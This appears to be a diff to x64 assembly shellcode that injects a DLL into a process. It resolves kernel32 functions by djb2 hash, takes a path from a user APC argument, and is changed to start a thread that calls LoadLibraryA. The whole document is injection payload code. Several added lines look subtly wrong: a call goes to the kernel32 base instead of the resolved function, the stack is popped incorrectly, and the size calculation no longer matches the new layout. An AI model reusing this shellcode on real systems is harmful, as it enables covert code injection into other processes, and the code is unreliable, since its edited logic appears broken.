@@ -1,5 +1,7 @@
 TITLE LoadLibrary shellcode
 
+; Creates a new thread and loads a library into it
+
 .CODE
 
 ; Returns the size of the shellcode
@@ -8,43 +10,84 @@ GetShellcodeSize PROC
     mov eax, (shellcode_end - offset RunShellcode)
 GetShellcodeSize ENDP
 
-; the main function
-RunShellcode PROC
+CreateShellcodeThread PROC
     mov rax, rsp
     mov r13, [rsp+8]   ; SystemArgument1, see ntkrla57!KiInitializeUserApc
     and rsp, 0ffffffffffffff00h
     add rsp, 8
     push rax
-
-    call get_rip
-
-get_rip:
-    pop r15
-
+    
     mov rcx, 6ddb9555h	; djb2("KERNEL32.DLL")
     call get_module_base
     mov r12, rax
+    test r12, r12
+    je end_create_thread_shellcode
 
+    ; get address of CreateThread
+    mov rcx, 7f08f451h ; djb2("CreateThread")
+    mov rdx, r12
+    call resolve_import
+    mov r14, rax
+    test r14, r14
+    je end_create_thread_shellcode
+
+    ; call CreateThread
+    mov rcx, 0 ; lpSecurityAttributes
+    mov rdx, 0 ; default stack size
+    mov r8, RunShellcode ; starting address
+    mov r9, r13 ; passing the path to the dll as an argument
+    push rcx    ; thread id
+    push rcx    ; default creation flags
+    call r14
+
+end_create_thread_shellcode:
+    pop rsp
+    ret
+CreateShellcodeThread ENDP
+
+; the main function: loads a library from a specified path
+; 
+; rcx - kernel32 base
+; rdx - path to dll
+RunShellcode PROC
+    mov r13, rcx ; path to dll
+    
+    ; load kernel32
+    mov rcx, 6ddb9555h	; djb2("KERNEL32.DLL")
+    call get_module_base
+    mov r12, rax
+    test r12, r12
     cmp rax, 0
     je shellcode_end
 
+    mov rcx, r13
+    mov rdx, rax
+    call LoadLib    ; load kernel32!LoadLibrary on input
+
+shellcode_end:
+    ret
+RunShellcode ENDP
+
+; Loads a library from a given path
+; 
+; rcx - address of path
+; rdx - address of kernel32.dll
+LoadLib PROC
+    mov rbx, rcx
     mov rcx, 5fbff0fbh	; djb2("LoadLibraryA")
-    mov rdx, r12
     call resolve_import
 
     cmp rax, 0
-    je shellcode_end
+    je LoadLib_end
 
     sub rsp, 16
-
-    mov rcx, r13
-    call rax			; LoadLibraryA(SystemArgument1)
-
+    mov rcx, rbx
+    call rdx
     add rsp, 16
-shellcode_end:
-    pop rsp
+LoadLib_end:
     ret
-RunShellcode ENDP
+LoadLib ENDP
+
 
 ; djb2 hash function
 ; rcx - the address of the string (must be null-terminated)
